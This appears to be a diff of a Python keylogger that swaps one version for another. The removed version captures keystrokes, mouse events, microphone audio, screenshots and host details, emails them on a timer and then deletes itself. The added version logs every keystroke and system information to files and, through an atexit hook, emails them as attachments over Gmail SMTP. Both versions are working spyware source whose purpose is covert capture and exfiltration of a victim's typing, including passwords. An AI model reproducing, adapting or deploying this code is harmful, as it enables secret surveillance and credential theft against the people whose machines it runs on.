@@ -1,145 +1,107 @@
-# Import necessary modules
-import logging
-import os
-import platform
-import smtplib
+from pynput.keyboard import Key, Listener
 import socket
-import threading
-import wave
-import pyscreenshot
-import sounddevice as sd
-from pynput import keyboard
-from pynput.keyboard import Listener
-from email import encoders
-from email.mime.base import MIMEBase
+import platform
+import os 
+import smtplib
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
-import glob
+from email.mime.base import MIMEBase
+from email import encoders
+import atexit
 
-# Set your email and password for demonstration purposes
-EMAIL_ADDRESS = "YOUR_USERNAME"
-EMAIL_PASSWORD = "YOUR_PASSWORD"
-SEND_REPORT_EVERY = 60  # Report interval in seconds
+keys_info = "key_log.txt"
+sys_info = "system_info.txt"
 
-# KeyLogger class for educational purposes
-class KeyLogger:
-    def __init__(self, time_interval, email, password):
-        self.interval = time_interval
-        self.log = "KeyLogger Started for Educational Demonstration..."
-        self.email = email
-        self.password = password
+file_path = os.getcwd()
+extend = "\\"
+file_merge = file_path + extend
 
-    def appendlog(self, string):
-        self.log = self.log + string
+def send_email(filename, attachment, toaddr):
+    fromaddr = "from@gmail.com"
 
-    def on_move(self, x, y):
-        current_move = logging.info("Mouse moved to {} {}".format(x, y))
-        self.appendlog(current_move)
+    msg = MIMEMultipart()
 
-    def on_click(self, x, y):
-        current_click = logging.info("Mouse moved to {} {}".format(x, y))
-        self.appendlog(current_click)
+    msg['From'] = fromaddr
+    msg['To'] = toaddr
+    msg['Subject'] = "Log File"
 
-    def on_scroll(self, x, y):
-        current_scroll = logging.info("Mouse moved to {} {}".format(x, y))
-        self.appendlog(current_scroll)
+    body = "Log filt attached"
 
-    def save_data(self, key):
-        try:
-            current_key = str(key.char)
-        except AttributeError:
-            if key == key.space:
-                current_key = "SPACE"
-            elif key == key.esc:
-                current_key = "ESC"
-            else:
-                current_key = " " + str(key) + " "
+    msg.attach(MIMEText(body,'plain'))
 
-        self.appendlog(current_key)
+    attachment = open(attachment, 'rb')
 
-    def send_mail(self, email, password, message):
-        sender = "Private Person <from@example.com>"
-        receiver = "A Test User <to@example.com>"
+    p = MIMEBase('application', 'octet-stream')
+    p.set_payload((attachment).read())
+    encoders.encode_base64(p)
+    p.add_header('Content-Disposition', f"attachment; filename={filename}")
 
-        m = f"""\
-        Subject: main Mailtrap
-        To: {receiver}
-        From: {sender}
+    msg.attach(p)
 
-        Keylogger by aydinnyunus\n"""
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+    s.starttls()
+    s.login(fromaddr,"password")
 
-        m += message
-        with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
-            server.login(email, password)
-            server.sendmail(sender, receiver, message)
+    text = msg.as_string()
+    s.sendmail(fromaddr,toaddr,text)
+    s.quit()
 
-    def report(self):
-        self.send_mail(self.email, self.password, "\n\n" + self.log)
-        self.log = ""
-        timer = threading.Timer(self.interval, self.report)
-        timer.start()
+def send_logs():
+    toaddr = "to@gmail.com"
+    send_email(keys_info,file_path + extend + keys_info, toaddr)
+    send_email(sys_info, file_path + extend + sys_info, toaddr)
+    print("Sent")
 
-    def system_information(self):
+atexit.register(send_logs)
+
+count = 0
+keys = []
+
+def computer_information():
+    with open(file_path + extend + sys_info, "a") as f:
         hostname = socket.gethostname()
-        ip = socket.gethostbyname(hostname)
-        plat = platform.processor()
-        system = platform.system()
-        machine = platform.machine()
-        self.appendlog(hostname)
-        self.appendlog(ip)
-        self.appendlog(plat)
-        self.appendlog(system)
-        self.appendlog(machine)
+        try:
+            IPAddr = socket.gethostbyname(hostname)
+        except socket.gaierror:
+            IPAddr = "Could not get IP address"
+        
+        f.write("Processor: " + platform.processor() + '\n')
+        f.write("System: " + platform.system() + " " + platform.version() + '\n')
+        f.write("Machine: " + platform.machine() + '\n')
+        f.write("Hostname: " + hostname + "\n")
+        f.write("IP Address: " + IPAddr + "\n")
 
-    def microphone(self):
-        fs = 44100
-        seconds = SEND_REPORT_EVERY
-        obj = wave.open('sound.wav', 'w')
-        obj.setnchannels(1)  # mono
-        obj.setsampwidth(2)
-        obj.setframerate(fs)
-        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
-        obj.writeframesraw(myrecording)
-        sd.wait()
+computer_information()
 
-        self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)
+def on_press(key):
+    print(key,end=" ")
+    print("pressed")
+    global keys, count
+    keys.append(str(key))
+    count += 1
 
-    def screenshot(self):
-        img = pyscreenshot.grab()
-        self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=img)
+    if count >= 1:
+        count = 0
+        write_file(keys)
 
-    def run(self):
-        keyboard_listener = keyboard.Listener(on_press=self.save_data)
-        with keyboard_listener:
-            self.report()
-            keyboard_listener.join()
-        with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
-            mouse_listener.join()
-        if os.name == "nt":
-            try:
-                pwd = os.path.abspath(os.getcwd())
-                os.system("cd " + pwd)
-                os.system("TASKKILL /F /IM " + os.path.basename(__file__))
-                print('File was closed.')
-                os.system("DEL " + os.path.basename(__file__))
-            except OSError:
-                print('File is close.')
+def write_file(keys):
+    with open(file_path + extend + keys_info,"a") as f:
+        for key in keys:
+            k = str(key).replace("'","")
+            if k.startswith("Key."):
+                if k == "Key.space":
+                    f.write(" ")
+                elif k == "Key.enter":
+                    f.write("\n")
+            elif len(k) == 3 and k.startswith("'") and k.endswith("'"):
+                f.write(k[1])
+            else:
+                f.write(k)
 
-        else:
-            try:
-                pwd = os.path.abspath(os.getcwd())
-                os.system("cd " + pwd)
-                os.system('pkill leafpad')
-                os.system("chattr -i " +  os.path.basename(__file__))
-                print('File was closed.')
-                os.system("rm -rf" + os.path.basename(__file__))
-            except OSError:
-                print('File is close.')
 
-# Function to run the educational demonstration
-def main():
-    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
-    keylogger.run()
-
-if __name__ == "__main__":
-    main()
+def on_release(key):
+    if key == Key.esc:
+        return False
+    
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
